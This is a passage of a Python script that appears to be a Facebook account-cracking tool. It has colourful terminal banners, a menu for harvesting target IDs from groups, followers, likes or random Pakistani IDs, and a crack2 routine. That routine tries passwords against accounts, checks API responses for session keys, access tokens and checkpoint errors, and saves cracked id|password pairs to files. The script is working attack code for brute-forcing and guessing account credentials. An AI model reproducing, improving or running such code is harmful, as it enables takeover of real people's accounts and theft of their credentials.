...
\n      \x1b
[1;96m______/\\\\\\\\\_______________/\\\\\\\\\\\\\\\____________/\\\\\\\\\\\\\\\_        
 ____/\\\///////\\\____________\///////\\\/////____________\/////////////\\\_       
  ___/\\\______\//\\\_________________\/\\\____________________________/\\\/__      
   __\//\\\_____/\\\\\_________________\/\\\__________________________/\\\/____     
    ___\///\\\\\\\\/\\\_________________\/\\\________________________/\\\/______    
     _____\////////\/\\\_________________\/\\\______________________/\\\/________   
      ___/\\________/\\\__________________\/\\\____________________/\\\/__________  
       __\//\\\\\\\\\\\/___________________\/\\\__________________/\\\/____________ 
        ___\///////////_____________________\///__________________\///______________ \n      \x1b[1;96m \n      \x1b[1;96m 
\n\x1b[1;93m─━㋱\x1b[1;97mSTATUS\x1b[1;90m : \x1b[1;97m[\x1b[1;92mFree✓\x1b[1;97m]\x1b[1;97m TEAM\x1b[1;90m : \x1b[1;97mHA HA HA HA\x1b[1;93m㋱━─\n\x1b[1;90m───────────────────────────────────────────────────\n   \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m Crack from  Group(lol)\n   \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m Crack from Public(lol)\n   \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m Crack from  Followers(lol)\n   \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m Crack from Likes(lol)\n   \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m Crack Random pak idz(lol)\n   \x1b[1;90m[\x1b[1;97m01\x1b[1;90m]\x1b[1;97m Crack File Cloning(BEST😊)\n   \x1b[1;90m[\x1b[1;97m00\x1b[1;90m]\x1b[1;97m EXIT\n"""%(h))
	print("""%s\x1b[1;90m───────────────────────────────────────────────────"""%(h))
	JHALLA = input(x+'   \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m ENTER\x1b[1;90m :\x1b[1;92m ')
	if JHALLA in ['1','01']:
		File2()
	elif JHALLA in ['0','00']:
		...
		os.system("https://youtube.com/channel/UC7VzQau0F-tsOkRcksAmmxw")
		exit()
...
def setting():
	...
	JHALLA = input(x+'   \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m Select one\x1b[1;90m :\x1b[1;92m ')
	if JHALLA in ['1','01']:
		for bacot in id:
			id2.append(bacot)
	elif JHALLA in ['2','02']:
...
def passwrd():
	...
	banner()
	print("""%s      \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m V\x1b[1;90m:\x1b[1;97m 1.0\n      \x1b[1;96m
______/\\\\\\\\\_______________/\\\\\\\\\\\\\\\____________/\\\\\\\\\\\\\\\_        
 ____/\\\///////\\\____________\///////\\\/////____________\/////////////\\\_       
  ___/\\\______\//\\\_________________\/\\\____________________________/\\\/__      
   __\//\\\_____/\\\\\_________________\/\\\__________________________/\\\/____     
    ___\///\\\\\\\\/\\\_________________\/\\\________________________/\\\/______    
     _____\////////\/\\\_________________\/\\\______________________/\\\/________   
      ___/\\________/\\\__________________\/\\\____________________/\\\/__________  
       __\//\\\\\\\\\\\/___________________\/\\\__________________/\\\/____________ 
        ___\///////////_____________________\///__________________\///______________\x1b[1;96m\x1b[1;96m\x1b[1;96m\x1b[1;93m─━㋱\x1b[1;97mSTATUS\x1b[1;90m : \x1b[1;97m[\x1b[1;92mFree✓\x1b[1;97m]\x1b[1;97m TEAM🙈\x1b[1;90m : \x1b[1;97mNO ONE😞\x1b[1;93m㋱━─\n\x1b[1;90m───────────────────────────────────────────────────\x1b[92;1m """%(h))
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s   [JHALLA] %s/%s  CP/%s | OK/%s : %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s   [JHALLA-OK] %s|%s        '%(b,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "session_key" in resp.text and "EAAB" in resp.text:
				print('\r%s   [JHALLA-OK] %s|%s        '%(h,idf,pw))
